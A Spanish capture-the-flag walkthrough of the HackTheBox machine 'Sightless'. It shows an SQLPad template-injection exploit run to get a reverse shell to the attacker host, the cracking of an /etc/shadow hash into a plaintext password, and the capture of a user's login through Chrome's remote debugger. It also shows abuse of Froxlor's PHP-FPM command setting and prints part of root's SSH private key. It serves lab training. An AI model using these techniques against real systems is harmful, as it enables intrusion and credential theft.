---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Sightless

`Sightless` es una máquina Linux de dificultad fácil que presenta un sitio web para una empresa que ofrece varios servicios. La enumeración del sitio web revela una instancia `SQLPad` vulnerable a la inyección de plantilla `CVE-2022-0944(`[https://nvd.nist.gov/vuln/detail/CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)`)`, que se aprovecha para afianzarse dentro de un contenedor Docker.

Una enumeración adicional revela el archivo `/etc/shadow` con un hash de contraseña, que se descifra para revelar la contraseña, lo que otorga acceso `SSH` al host. La enumeración posterior a la explotación revela una instancia `Froxlor` vulnerable a Blind XSS `CVE-2024-34070`([https://nvd.nist.gov/vuln/detail/CVE-2024-34070](https://nvd.nist.gov/vuln/detail/CVE-2024-34070)).&#x20;

Esto se aprovecha para obtener acceso al servicio FTP, que contiene una base de datos KeePass. El acceso a la base de datos revela las claves `SSH` raíz, lo que conduce a un shell privilegiado en el host.

También podemos aprovechar para convertirnos en usuario raíz con la función PHP-FPM en Froxlor para obtener una ejecución de código remoto para obtener el id\_rsa del usuario raíz.

<figure><img src="../../../../.gitbook/assets/Sightless.png" alt="" width="563"><figcaption></figcaption></figure>

## Reconnaissance

Realizaremos un reconocimiento con `Nmap` para ver los puertos que están expuestos en la máquina **`Sightless`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.11.32 -oG allPorts
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-17 00:04 CET
Nmap scan report for 10.10.11.32
Host is up (0.061s latency).
Not shown: 65349 closed tcp ports (reset), 183 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.24 seconds
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.32
	[*] Open ports: 21,22,80

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato `oN` y `oX` para posteriormente trabajar con ellos. Verificamos que al parecer se trata de una máquina Ubuntu que dispone de una página de `Nginx` y servicios `FTP` y `SSH`.

```bash
❯ nmap -sCV -p21,22,80 10.10.11.32 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-17 00:07 CET
Nmap scan report for 10.10.11.32
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.95%I=7%D=1/17%Time=6789914A%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20Ser
SF:ver\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20try
SF:\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20b
SF:eing\x20more\x20creative\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   65.03 ms 10.10.16.1
2   32.01 ms 10.10.11.32

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.07 seconds
```

Procederemos a transformar el archivo generado `targetedXML` para transformar el `XML` en un archivo `HTML` para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../../../.gitbook/assets/3737_vmware_Q5bonpzyBa.png" alt=""><figcaption></figcaption></figure>

Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`, debido que en el resultado de `Nmap`, nos aparecía que el sitio web nos redirigía a [http://sightless.htb](http://sightless.htb).

```bash
❯ catnp /etc/hosts | grep sightless.htb
10.10.11.31 sightless.htb
```

## Web Enumeration

A través de la herramienta `whatweb` revisaremos las tecnologías que utiliza el sitio web.

```bash
❯ whatweb http://sightless.htb
http://sightless.htb [200 OK] Country[RESERVED][ZZ], Email[sales@sightless.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.32], Title[Sightless.htb], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

Procederemos a acceder a [http://sightless.htb ](http://sightless.htb)y procederemos a investigar sobre el sitio wbe.

<figure><img src="../../../../.gitbook/assets/3738_vmware_Tt8Y0Uu63d.png" alt="" width="563"><figcaption></figcaption></figure>

Revisando en el sitio web, verificamos que haciendo hovering en el sitio web, nos encontramos que al parecer existe un sitio web llamado `sqlpad.sightless.htb`.

<figure><img src="../../../../.gitbook/assets/imagen (84).png" alt="" width="473"><figcaption></figcaption></figure>

Procederemos a realizar una enumeración de directorios básica con la herramienta de `dirsearch`, verificamos que no logramos obtener ningún resultado esperado.

```bash
❯ dirsearch -u http://sightless.htb 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/Sightless/Sightless/content/reports/http_sightless.htb/_25-01-17_00-14-02.txt

Target: http://sightless.htb/

[00:14:02] Starting: 
[00:15:04] 301 -  178B  - /images  ->  http://sightless.htb/images/
[00:15:04] 403 -  564B  - /images/

Task Completed
```

Procederemos a añadir en nuestro archivo `/etc/hosts` la entrada `sqlpad.sightless.htb`.

```bash
❯ cat /etc/hosts | grep sightless.htb
10.10.11.32 sightless.htb sqlpad.sightless.htb
```

### Abusing SQLPad < 6.10.1 - Remote Code Execution (CVE-2022-0944)&#x20;

Al acceder a [http://sqlpad.sightless.htb](http://sqlpad.sightless.htb) y revisar información sobre el sitio web, nos damos cuenta que se trata de una aplicación web de `SQLPad`.

{% hint style="info" %}
SQLPad es una aplicación web que permite escribir y ejecutar consultas SQL de manera fácil y visualizar los resultados al instante.
{% endhint %}

Al revisar más información sobre la versión del `SQLPad`, verificamos que es una versión vulnerable. Realizando una búsqueda por internet, nos encontramos con el siguiente CVE.

{% embed url="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2022-0944" %}

{% hint style="danger" %}
Una inyección de plantillas en el endpoint de prueba de conexión conlleva a un RCE en el repositorio de GitHub sqlpad/sqlpad versiones anteriores a 6.10.1
{% endhint %}

<figure><img src="../../../../.gitbook/assets/imagen (86).png" alt=""><figcaption></figcaption></figure>

Por otro lado, también logramos encontrar un repositorio de GitHub donde nos proporcionan un exploit para aprovecharnos de la vulnerabilidad. Procederemos a clonarnos el repositorio en nuestro equipo atacante.

{% embed url="https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944" %}

```bash
❯ git clone https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944; cd sqlpad-rce-exploit-CVE-2022-0944
Clonando en 'sqlpad-rce-exploit-CVE-2022-0944'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Recibiendo objetos: 100% (12/12), 4.77 KiB | 976.00 KiB/s, listo.
Resolviendo deltas: 100% (1/1), listo.
```

También verificamos el uso del exploit, en el cual nos indica que nos pongamos en escucha con `nc` por un puerto y al ejecutar el exploit recibiremos en principio una Reverse Shell hacía la máquina.

<figure><img src="../../../../.gitbook/assets/3742_vmware_UyFsoT6KiY.png" alt=""><figcaption></figcaption></figure>

Tal y como nos indica el PoC del exploit, nos pondremos en escucha por un puerto.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Le daremos permisos de ejecución al exploit, procederemos a utilizarlo proporcionándole la URL del SQLPad ([http://sqlpad.sightless.htb](http://sqlpad.sightless.htb)) y nuestra dirección y el puerto donde estamos escuchando con `nc`.

```bash
❯ chmod +x exploit.py
❯ python exploit.py http://sqlpad.sightless.htb/ 10.10.16.5 443
Response status code: 400
Response body: {"title":"connect ECONNREFUSED 127.0.0.1:3306"}
Exploit sent, but server responded with status code: 400. Check your listener.
```

Verificamos nuevamente que hemos recibido correctamente acceso a la máquina, pero al parecer no nos encontramos en la máquina principal. Parece ser que nos encontramos como usuario `root` en una especia de máquina de Docker que es la que levantaba el servicio de `SQLPad`.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.32] 59752
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad$ whoami
root
root@c184118df0a6:/var/lib/sqlpad$ hostname -I
172.17.0.2 
```

## Initial Access

Procederemos a revisar el archivo `/etc/passwd` en busca de usuarios que dispongan de una `bash`, en el resultado obtenido verificamos que el usuario `michael` dispone de terminal.

```bash
root@c184118df0a6:/var/lib/sqlpad$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

### Cracking Hashes in /etc/shadow File

Dado que actualmente somos el usuario `root`, procederemos a revisar el contenido del archivo `/etc/passwd` el cual contiene las contraseñas de los usuarios, entre las cuales apareecn la del usuario `michael`.

```bash
root@c184118df0a6:/var/lib/sqlpad% cat /etc/shadow | grep michael
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
root@c184118df0a6:/var/lib/sqlpad% 
```

Procederemos a guardarnos en nuestro equipo local el hash del usuario en un archivo llamado `hashes`.

Al proceder a intentar crackear el hash con la herramienta de `hashcat`, revisaremos que finalmente logramos crackear el hash y obtener la contraseña en texto plano.

```bash
❯ hashcat -a 0 hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2913/5891 MB (1024 MB allocatable), 8MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1800 | sha512crypt $6$, SHA512 (Unix) | Operating System

...[snip]...
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
...[snip]...
```

Probaremos de acceder al equipo víctima `10.10.11.32` mediante el protocolo `SSH` con el usuario `michael` y las credenciales obtenidas y verificamos que hemos logrado acceder al equipo y verificar la flag de **user.txt**.

```bash
❯ ssh michael@10.10.11.32
The authenticity of host '10.10.11.32 (10.10.11.32)' can't be established.
ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.32' (ED25519) to the list of known hosts.
michael@10.10.11.32's password: 
Last login: Tue Sep  3 11:52:02 2024 from 10.10.14.23
michael@sightless:~$ hostname -I
10.10.11.32 172.17.0.1
michael@sightless:~$ cat user.txt 
f6c0f150546ac*******************
```

## Privilege Escalation

### Discover Internal Web Server (SSH Port Forwarding)

Revisando los puertos que se encuentran abiertos en el equipo local (localhost), verificamos que existen varios puertos inusuales.

```bash
michael@sightless:~$ ss -tuln | grep 127.0.0.1
tcp   LISTEN 0      511        127.0.0.1:8080       0.0.0.0:*          
tcp   LISTEN 0      5          127.0.0.1:42673      0.0.0.0:*          
tcp   LISTEN 0      10         127.0.0.1:36123      0.0.0.0:*          
tcp   LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:39529      0.0.0.0:*          
tcp   LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*
```

Al realizar un `cURL` de la dirección `127.0.0.1:8080`, verificamos que se trata de una página web de Froxlor.

```bash
michael@sightless:~$ curl 127.0.0.1:8080
<!DOCTYPE html>
<html lang="en" data-bs-theme="light">
<head>
	<!-- Required meta tags -->
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta name="robots" content="noindex, nofollow, noarchive"/>
	<meta name="googlebot" content="nosnippet"/>
	<link rel="icon" type="image/x-icon" href="templates/Froxlor/assets/img/icon.png">
	<meta name="csrf-token" content="5ed98ba2c05bf406bc7aafd129eabbcc701cb7d3" />
	<!-- Assets  -->
	<link rel="stylesheet" href="templates/Froxlor/build/assets/app-61450a15.css">
<script src="templates/Froxlor/build/assets/app-67d6acee.js" type="module"></script>

	<title>Froxlor</title>
</head>
```

Procederemos a realizar Port Forwarding para indicar que nuestro `localhost:8080` sea el `127.0.0.1:8080` de la máquina víctima.

```bash
❯ ssh -L 8080:127.0.0.1:8080 michael@10.10.11.32
michael@10.10.11.32's password: 
Last login: Fri Jan 17 00:03:14 2025 from 10.10.16.5
```

Desde nuestro equipo al verificar el acceso a http://127.0.0.1:8080, verificamos que es un panel de autenticación de Froxlor.

{% hint style="info" %}
Froxlor es un Panel de control de servidores multilenguaje, con una interfaz gráfica web que permite administrar, entre otros, los servicios de correo electrónico, dominios y FTP. Está pensado para proveedores de servicios de internet (ISP) o revendedores de servicios de alojamiento web.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/imagen (87).png" alt=""><figcaption></figcaption></figure>

Al revisar los archivos habilitados  de `Froxlor` que se encuentran en el equipo víctima, verificamos varios subdominios (`admin.sightless.htb` y `web1.sightless.htb`).

<pre class="language-bash"><code class="lang-bash">michael@sightless:~$ ls -l /etc/apache2/sites-enabled/
total 20
lrwxrwxrwx 1 root root   35 May 15  2024 000-default.conf -> ../sites-available/000-default.conf
-rw-r--r-- 1 root root 1480 Aug  2 09:05 002-sqlpad.conf
-rw-r--r-- 1 root root  264 Sep  3 11:55 05_froxlor_dirfix_nofcgid.conf
-rw-r--r-- 1 root root  770 Sep  3 11:55 10_froxlor_ipandport_192.168.1.118.80.conf
-rw-r--r-- 1 root root  917 Sep  3 11:55 34_froxlor_normal_vhost_web1.sightless.htb.conf
-rw-r--r-- 1 root root  412 Sep  3 11:55 40_froxlor_diroption_666d99c49b2986e75ed93e591b7eb6c8.conf
michael@sightless:~$ cat /etc/apache2/sites-enabled/05_froxlor_dirfix_nofcgid.conf 
...[snip]...
  &#x3C;Directory "/var/customers/webs/">
    Require all granted
    AllowOverride All
  &#x3C;/Directory>
<strong>michael@sightless:~$ cat /etc/apache2/sites-enabled/10_froxlor_ipandport_192.168.1.118.80.conf 
</strong>...[snip]...
&#x3C;VirtualHost 192.168.1.118:80>
DocumentRoot "/var/www/html/froxlor"
 ServerName admin.sightless.htb
...[snip]...
&#x3C;/VirtualHost>
michael@sightless:~$ cat /etc/apache2/sites-enabled/34_froxlor_normal_vhost_web1.sightless.htb.conf 
&#x3C;VirtualHost 192.168.1.118:80>
  ServerName web1.sightless.htb
  ServerAlias *.web1.sightless.htb
  ServerAdmin john@sightless.htb
...[snip]...
&#x3C;/VirtualHost>
michael@sightless:~$ cat /etc/apache2/sites-enabled/40_froxlor_diroption_666d99c49b2986e75ed93e591b7eb6c8.conf 
...[snip]...
&#x3C;Directory "/var/customers/webs/web1/goaccess/">
  AuthType Basic
  AuthName "Restricted Area"
  AuthUserFile /etc/apache2/froxlor-htpasswd/1-666d99c49b2986e75ed93e591b7eb6c8.htpasswd
  require valid-user
&#x3C;/Directory>
</code></pre>

Procederemos a añadir estas estradas en nuestro equipo pero en el `localhost`, debido que estamos realizando Port-Forwaring y añadiendo estas entradas en la dirección IP de la máquina víctima no nos serviría, ya que al Froxlor solamente disponemos de acceso desde nuestro `127.0.0.1` debido al Port Forwarding realizado con `SSH`.

```bash
❯ echo -e '127.0.0.1\t\tadmin.sightless.htb web1.sightless.htb' | sudo tee -a /etc/hosts
127.0.0.1		admin.sightless.htb web1.sightless.htb
```

### Chrome Remote Debugger Pentesting&#x20;

Revisando los procesos que se encuentran en ejecución en el sistema, verificamos que hay un usuario llamado `john` que se encuentra ejecutando servicios como `Chrome`, lo cual parece que se encuentra ahora mismo activo.

```bash
michael@sightless:~$ ps aux
...[snip]...
john        1203  0.0  0.0   2892   980 ?        Ss   Jan16   0:00 /bin/sh -c sleep 140 && /home/john/automation/healthcheck.sh
john        1204  0.0  0.0   2892   972 ?        Ss   Jan16   0:00 /bin/sh -c sleep 110 && /usr/bin/python3 /home/john/automation/administration.py
john        1596  0.0  0.6  33660 24692 ?        S    Jan16   0:02 /usr/bin/python3 /home/john/automation/administration.py
john        1597  0.5  0.3 33630172 15424 ?      Sl   Jan16   0:17 /home/john/automation/chromedriver --port=42673
john        1602  0.0  0.0      0     0 ?        Z    Jan16   0:00 [chromedriver] <defunct>
john        1608  0.8  2.9 34011388 118652 ?     Sl   Jan16   0:29 /opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-s
john        1610  0.0  0.0 33575860 3152 ?       Sl   Jan16   0:00 /opt/google/chrome/chrome_crashpad_handler --monitor-self-annotation=ptype=crashpad-handler --database=/tmp/Crashpad --url=https://clients2.google.com/cr/report -
john        1614  0.0  1.4 34112456 56312 ?      S    Jan16   0:00 /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --no-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1610 --enable
john        1615  0.0  1.4 34112452 56312 ?      S    Jan16   0:00 /opt/google/chrome/chrome --type=zygote --no-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1610 --enable-crash-reporter
john        1628  0.6  3.1 34365168 125672 ?     Sl   Jan16   0:21 /opt/google/chrome/chrome --type=gpu-process --no-sandbox --disable-dev-shm-usage --headless --ozone-platform=headless --use-angle=swiftshader-webgl --headless --
john        1631  0.1  2.1 33900068 87180 ?      Sl   Jan16   0:04 /opt/google/chrome/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-sandbox --disable-dev-shm-u
john        1660  3.1  4.4 1186796396 177628 ?   Sl   Jan16   1:51 /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=1610 --no-sandbox --disable-dev-shm-usage --enable-automation --remote-debugging-port=
...[snip]...
```

Revisando los procesos activos sobre los puertos internos que habíamos descubierto anteriormente, verificamaos que hay un proceso del usuario `john` que utiliza este puerto interno con un proceso de `Chrome`, lo cual sugiere que el usuario se encuentra actualmente utilizando el navegdor.

```bash
michael@sightless:~$ ps aux | grep '42673'
john        1597  0.4  0.3 33630172 15424 ?      Sl   Jan16   0:18 /home/john/automation/chromedriver --port=42673
```

Dado que `John` está autenticado y visualiza la página web de `Froxlor` con Chrome en el destino, podemos aprovechar el puerto de herramientas de desarrollo remoto para ver la página como `John`.

Sin embargo, no está claro en qué puerto está escuchando el depurador, por lo que simplemente reenviaremos varios puertos y los probaremos todos los que encontramos inicialmente.

{% hint style="info" %}
La función de depuración remota de Chrome permite que el malware obtenga acceso a las cookies después de la explotación. No se requieren privilegios de root. Se trata de una técnica adversarial bastante conocida y de uso común, al menos desde 2018, cuando se lanzó Cookie Crimes.
{% endhint %}

{% embed url="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/?ref=benheater.com" %}

```bash
❯ ssh -L 127.0.0.1:8080:127.0.0.1:8080 -L 127.0.0.1:42673:127.0.0.1:42673 -L 127.0.0.1:36123:127.0.0.1:36123 -L 127.0.0.1:3306:127.0.0.1:3306 -L 127.0.0.1:3000:127.0.0.1:3000 -L 127.0.0.1:39529:127.0.0.1:39529 -L 127.0.0.1:33060:127.0.0.1:33060 michael@10.10.11.32
michael@10.10.11.32's password: 
Last login: Fri Jan 17 00:31:24 2025 from 10.10.16.5
```

Procederemos a acceder con `Chromium` y accederemos a la siguiente página web.

```url
chrome://inspect/#devices
```

Al acceder al sitio web, deberemos de configurar el target, para ello le daremos a _**Configure**_.

<figure><img src="../../../../.gitbook/assets/imagen (79).png" alt="" width="520"><figcaption></figcaption></figure>

Añadiremos los puertos que hemos realizado _**Port-Forwarding**_ sober los puertos internos de la máquina víctima.

<figure><img src="../../../../.gitbook/assets/imagen (175).png" alt=""><figcaption></figcaption></figure>

Al revisar nuevamente, verificamos que logramos obtener la sesión de depuración remota, procederemos a acceder a _**Inspect**_.

<figure><img src="../../../../.gitbook/assets/imagen (176).png" alt=""><figcaption></figcaption></figure>

Al acceder a la depuración remota de Chrome, verificamos que hay una sesión activa al parecer del usuario `john`, en la cual se encuentra accediendo al `Froxlor`. Pasado un tiempo, verificamos que cuando el usuario accede, en el apartado de (`Network < index.php < Payload`) verificamos que logramos obtener la contraseña que está ingresando el usuario.

<figure><img src="../../../../.gitbook/assets/imagen (177).png" alt=""><figcaption></figcaption></figure>

Probaremos de acceder con las credenciales obtenidas desde nuestro equipo a [http://127.0.0.1:8080](http://127.0.0.1:8080).

<figure><img src="../../../../.gitbook/assets/imagen (179).png" alt="" width="548"><figcaption></figcaption></figure>

Verificamos que hemos logrado acceder correctamente al `Froxlor` con el usuario `admin`.

<figure><img src="../../../../.gitbook/assets/imagen (180).png" alt=""><figcaption></figcaption></figure>

### Abusing PHP-FPM function to get Remote Code Execution on Froxlor

Después de una larga revisión en el sitio web, verificamos que podemos crear nuevas versiones de PHP que permiten ejecutar comandos para levantar servicios.

Esto lo podemos llevar a nuestro favor para crear una nueva versión la cual no ejecute un comando legítimo, sino un comando que nos interese a nosotros que ejecute.

<figure><img src="../../../../.gitbook/assets/imagen (184).png" alt=""><figcaption></figcaption></figure>

En este caso, procederemos a realizar que realice una copia de la clave privada SSH del usuario `root` y lo almacene en la siguiente ruta: `/tmp/id_rsa`.

<figure><img src="../../../../.gitbook/assets/imagen (190).png" alt=""><figcaption></figcaption></figure>

Procederemos de acceder a `System < Settings < PHP-FPM`.

<figure><img src="../../../../.gitbook/assets/imagen (187).png" alt=""><figcaption></figcaption></figure>

Volveremos a iniciar nuevamente el servicio de `PHP-FPM` para que ejecute la nueva versión de PHP que hemos creado. Esto lo que hará es cargar esa nueva versión y ejecutar el comando establecido.

<figure><img src="../../../../.gitbook/assets/imagen (188).png" alt=""><figcaption></figcaption></figure>

Después de un tiempo, verificamos que en el directorio `/tmp` ha aparecido la clave privada del usuario `root`. Pero con los permisos que dispone el archivo actualmente, no podemos utilizarlo.

```bash
michael@sightless:~$ ls -l /tmp
total 32
-rw------- 1 root root 3381 Jan 17 01:45 id_rsa
...[snip]...
```

El siguiente paso, será darle los permisos necesarios a la copia de la clave privada para poder utilizarla correctamente. Modificaremos la versión de PHP tal como realizamos anteriormente y volveremos a iniciar el servicio.

<figure><img src="../../../../.gitbook/assets/imagen (189).png" alt=""><figcaption></figcaption></figure>

Al cabo de un tiempo, verificamos que el archivo `id_rsa` ha sido modificado correctamente con permisos totales.

```bash
michael@sightless:~$ ls -l /tmp
total 32
-rwxrwxrwx 1 root root 3381 Jan 17 01:45 id_rsa
...[snip]...
```

Procederemos a verificar el contenido de la clave privada SSH del usuario `root`.

```bash
michael@sightless:/tmp$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
